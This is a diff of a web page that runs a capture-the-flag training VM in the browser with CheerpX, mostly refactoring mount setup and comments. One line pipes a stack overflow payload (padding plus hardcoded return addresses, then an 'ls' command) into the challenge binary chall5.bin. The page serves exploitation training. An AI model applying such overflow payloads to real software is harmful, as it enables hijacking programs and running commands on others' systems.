@@ -5,26 +5,33 @@
     <title>CTF training</title>
     <script src="https://cxrtnc.leaningtech.com/1.0.7/cx.js"></script>
     <script type="module">
-      var blockDevice = await CheerpX.HttpBytesDevice.create("/cheerpXImage.ext2");
-      var overlayDevice = await CheerpX.OverlayDevice.create(
-        blockDevice,
-        await CheerpX.IDBDevice.create("block1")
-      );
+      // Create a read-only block device for a disk image stored on the HTTP server
+      const blockDevice = await CheerpX.HttpBytesDevice.create("/cheerpXImage.ext2");
+      // Make the block device read-write using a persistent IndexedDB overlay
+      const idbDevice = await CheerpX.IDBDevice.create("block1");
+      const overlayDevice = await CheerpX.OverlayDevice.create(blockDevice, idbDevice);
+      // Add a device to expose a directory on the HTTP server in the VM
       const webDevice = await CheerpX.WebDevice.create("/ctf");
-
+      // Initialize the CheerpX environment
+      const mountPoints = [
+        // Use the disk image as the filesystem root
+        { type: "ext2", path: "/", dev: overlayDevice },
+        // Mount the WebDevice to a known location
+        { type: "dir", path: "/ctf", dev: webDevice },
+        // Add the required Linux pseudo-filesystem
+        {type:"devs", path:"/dev"},
+        {type:"devpts", path:"/dev/pts"},
+        {type:"proc", path:"/proc"}
+      ];
       const cx = await CheerpX.Linux.create({
-        mounts: [{ type: "ext2", path: "/", dev: overlayDevice },
-                 { type: "dir", path: "/ctf", dev: webDevice },
-        ],
+        mounts: mountPoints
       });
-
       // Setup the text console
       cx.setConsole(document.getElementById("console"));
-      // Run the sample one with some input
+      // Run the sample once with some input
       await cx.run("/bin/bash", ["-c", "printf 'an unsuccessful attempt' | /ctf/chall5.bin"]);
-      // Run the sample one again with input triggering a stack overflow
+      // Run the sample again with input triggering a stack overflow
       await cx.run("/bin/bash", ["-c", "printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xa0\\x83\\x04\\x08*\\x86\\x04\\x08P\\x86\\x04\\x08\\nls' | /ctf/chall5.bin"]);
-
     </script>
   </head>
   <body style="height: 100%; background: black;">
